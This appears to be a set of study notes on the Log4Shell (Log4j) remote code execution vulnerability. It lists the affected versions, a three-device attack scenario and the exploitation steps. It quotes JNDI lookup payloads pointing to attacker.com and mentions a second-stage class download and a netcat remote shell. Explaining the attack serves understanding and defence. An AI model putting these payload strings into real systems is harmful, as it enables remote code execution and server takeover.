Log4shell

RCE Vulnerability

Affected Version: log4j version 2.0 to 2.15.0-RC2

  • log4j version >= 2.16.0 2.17.0 is patched

Overview

Whole Story:

  • 3 devices:
    • D1: Attacker’s device with web client
    • D2: Web Server with vulnerable Log4j-core
    • D3: Normal LDAP server hosting a malicious java program
    • All devices are connected by Internet. In the demo, only 2 channels are utilized: D1 <-> D2; D2<-> D3
  • Activities
  1. In D1, Attacker opens a web client with a targeted URL, and input an attacking string (e.g. ${jndi:ldap://attacker.com/payload}) in the user id text field in the login web page.
  1. In D2, the web server passes the user id (i.e. the attacking string) to Log4. Log4j processes the attacking string, and starts a connection with server ldap://attacker.com to download a file “payload”
  1. In D3, once receiving the download request from D2, respond with the file “payload”
  1. In D2, the malicious java program “payload” is executed, and provide a remote access for the attacker (e.g. run a netcat server in D2)
  1. In D1, the attacker can execute any command in D2 remotely (e.g. using netcat).

Exploitation STEPs:

  • data from user gets sent to server (via any protocol)
  • the server logs the data in request that contain the malicious payload:
  • ${jndi:ldap://attacker.com/a}
  • log4j’s vulnerability is triggered. server makes a request to attacker.com via JNDI
  • the response is a path to a remote Java class file (e.g. http://second-stage.attacker.com/Exploit.class)
  • the Exploit.class payload is injected into the server process
    • the injected payload triggers 2nd stage for RCE
